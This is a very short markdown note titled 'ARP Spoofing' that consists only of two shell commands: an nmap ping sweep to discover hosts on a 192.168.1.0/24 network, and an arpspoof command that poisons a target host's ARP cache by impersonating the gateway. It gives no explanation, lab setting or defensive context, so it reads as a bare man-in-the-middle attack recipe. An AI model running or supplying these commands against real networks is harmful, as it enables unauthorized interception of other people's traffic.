## ARP Spoofing

´´´sh
sudo nmap -sn 192.168.1.1/24
´´´

´´´sh
sudo arpspoof -i eth0 -t 192.168.1.132 192.168.1.1
´´´
